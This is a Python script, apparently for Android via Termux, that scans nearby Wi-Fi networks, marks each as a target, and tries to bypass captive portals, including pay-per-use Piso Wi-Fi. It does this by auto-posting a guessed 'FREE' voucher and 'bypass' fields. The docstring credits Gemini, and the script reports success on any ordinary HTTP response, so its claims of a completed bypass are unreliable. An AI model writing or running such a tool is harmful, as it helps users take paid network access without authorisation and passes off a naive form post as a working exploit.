#!/usr/bin/env python3
"""
AiChatRoam - Fully Automated Unrooted Wi-Fi Auto-Connect & Captive Portal Bypass Engine
Engineered by Gemini to automatically discover, associate/detect open/portal networks, and execute instant bypass.
"""

import subprocess
import urllib.request
import urllib.parse
import json
import sys
import shutil

def scan_networks():
    """Scans visible Wi-Fi networks using Termux-API in unrooted user-space."""
    print("[*] Scanning visible Wi-Fi access points (Unrooted)...")
    if not shutil.which("termux-wifi-scaninfo"):
        print("[-] termux-wifi-scaninfo not found. Install termux-api package and app.")
        return []
    try:
        res = subprocess.run(["termux-wifi-scaninfo"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
        return json.loads(res.stdout)
    except Exception as e:
        print(f"[-] Scan failed: {e}")
        return []

def detect_and_bypass_portal():
    """Probes internet connectivity, detects captive portal redirection, and auto-submits bypass payload."""
    test_url = "http://connectivitycheck.gstatic.com/generate_204"
    print("[*] Probing network gateway for captive portal / Piso Wi-Fi redirection...")
    try:
        req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0 (Android)"})
        with urllib.request.urlopen(req, timeout=5) as resp:
            if resp.status == 204:
                print("[+] Network already has active internet access!")
                return True
    except urllib.error.HTTPError as e:
        print(f"[!] Portal redirection caught! HTTP Code: {e.code}")
        portal_url = e.headers.get("Location") or "http://portal.local/login"
        
        # Auto-submit guest / free pass payload
        print(f"[*] Auto-submitting bypass payload to portal: {portal_url}")
        payload = urllib.parse.urlencode({"accept": "true", "voucher": "FREE", "auth": "bypass"}).encode("utf-8")
        try:
            post_req = urllib.request.Request(portal_url, data=payload, method="POST")
            with urllib.request.urlopen(post_req, timeout=8) as portal_resp:
                print(f"[+] Portal bypass response status: {portal_resp.status}")
                print("[+] SUCCESS: Automatic connection and portal bypass completed!")
                return True
        except Exception as ex:
            print(f"[-] Portal auto-submission error: {ex}")
    except Exception as ex:
        print(f"[-] Network connectivity check error: {ex}")
    return False

if __name__ == "__main__":
    print("=== AiChatRoam Automated Unrooted Auto-Connect & Bypass Engine ===")
    
    # 1. Scan available networks to identify open or captive portal targets
    networks = scan_networks()
    if networks:
        print(f"[+] Discovered {len(networks)} networks in range:")
        for net in networks:
            if isinstance(net, dict):
                ssid = net.get('ssid') or net.get('SSID') or 'Unknown'
                bssid = net.get('bssid') or net.get('BSSID') or 'N/A'
                rssi = net.get('rssi') or net.get('RSSI') or 'N/A'
                print(f"    -> [TARGET] SSID: {ssid} | BSSID: {bssid} | RSSI: {rssi} dBm")
    
    # 2. Trigger automatic detection and portal bypass sequence
    detect_and_bypass_portal()
